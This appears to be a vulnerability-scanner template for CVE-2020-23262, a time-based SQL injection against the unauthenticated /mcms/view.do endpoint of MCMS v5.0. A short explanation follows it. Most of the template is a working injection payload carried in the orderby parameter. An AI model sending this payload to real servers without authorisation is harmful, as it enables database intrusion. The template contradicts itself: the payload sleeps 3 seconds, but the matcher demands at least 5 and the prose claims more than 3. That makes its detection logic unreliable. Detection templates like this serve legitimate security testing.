id: CVE-2020-23262

info:
  name: SQL Injection in MCMS v5.0 /mcms/view.do
  author: ProjectDiscoveryAI
  severity: critical
  description: An issue was discovered in ming-soft MCMS v5.0, where a malicious user can exploit SQL injection without logging in through /mcms/view.do.
  reference:
    - https://github.com/ming-soft/MCMS/issues/45

http:
  - method: GET
    path:
      - "{{BaseURL}}/mcms/view.do?id=221&order=desc&orderby=content_category_id%60,(select%201%20from%20(select%20if(1=1,sleep(3),sleep(0)))a)%23"

    matchers:
      - type: dsl
        dsl:
          - "duration>=5"
This template checks for a time-based SQL injection by injecting a delay condition into the SQL query and measuring the response time. If the response time is significantly longer (more than 3 seconds), it indicates a successful SQL injection.